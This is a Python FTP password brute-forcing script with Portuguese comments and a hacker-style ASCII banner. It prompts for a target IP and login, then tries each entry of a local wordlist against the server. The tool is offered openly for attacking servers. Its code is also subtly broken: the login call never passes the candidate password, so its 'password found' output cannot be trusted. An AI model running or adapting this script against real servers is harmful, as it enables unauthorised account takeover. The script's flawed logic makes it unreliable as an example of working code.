#!/usr/bin/python
# -*- coding: utf-8 -*-

# ANTES DE TUDO, CRIE UMA PASTA .TXT NA SUA DESKTOP COM O NOME DE wordlist.txt COM AS SUAS SENHAS.

# IMPORTANDO A LIB DO FTP
import ftplib


print('''

 © 2017 COPYRIGHT TODOS OS DIREITOS RESERVADOS POR LOOCK UNDERWOOD')

--------------------------------------------------------------------------------------

 ██████╗ ██████╗ ██╗   ██╗████████╗███████╗              ███████╗████████╗██████╗ 
 ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝              ██╔════╝╚══██╔══╝██╔══██╗
 ██████╔╝██████╔╝██║   ██║   ██║   █████╗      █████╗    █████╗     ██║   ██████╔╝
 ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝      ╚════╝    ██╔══╝     ██║   ██╔═══╝ 
 ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗              ██║        ██║   ██║     
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝              ╚═╝        ╚═╝   ╚═╝
 
--------------------------------------------------------------------------------------
 X----------------------------------------------------X
 | By: Loock Underwood / Créditos: AnonymousKillerBR1 |
 X----------------------------------------------------X ''')

# PARTE O QUAL O PROGRAMA PEGARÁ AS INFOS PARA FAZER A CONEXÃO 

try:
    ip = str(input("\n [+] Digite o IP do Alvo FTP: "))
    login_ftp = input("\n [+] Digite o Login do Servidor FTP: ")

    print('\n --------------------------------------------')
    arquivo = open("wordlist.txt", "r") # PARTE QUE O PROGRAMA IRÁ AUTOMATICAMENTE ABRIR UMA .TXT COM NOME WORLIST NA DESKTOP
    for linha in arquivo.readlines(): # AQUI O PROGRAMA IRÁ LER CADA LINHA DESTA LISTA, O R É READLINES, OU SEJA, LER
        try:

            servidor = ftplib.FTP(ip) # ENFIM, CHEGAMOS NA ÁREA DA CONEXÃO E OS TESTES DE SENHA
            servidor.login (login_ftp)
            print(' --------------------------------------------')
            print("\n [!] Senha Encontrada: % s" % linha)
            print(' --------------------------------------------')
            break # CASO O PROGRAMA ENCONTRE A SENHA CORRETA, ELE IRÁ PARAR 
            raise SystemExit
        except ftplib.error_perm:
            print("\n [-] Senha Incorreta:  % s" % linha)
            print('\n --------------------------------------------')
except KeyboardInterrupt:
    print("\n [!] Fim do Programa!")
    
                       
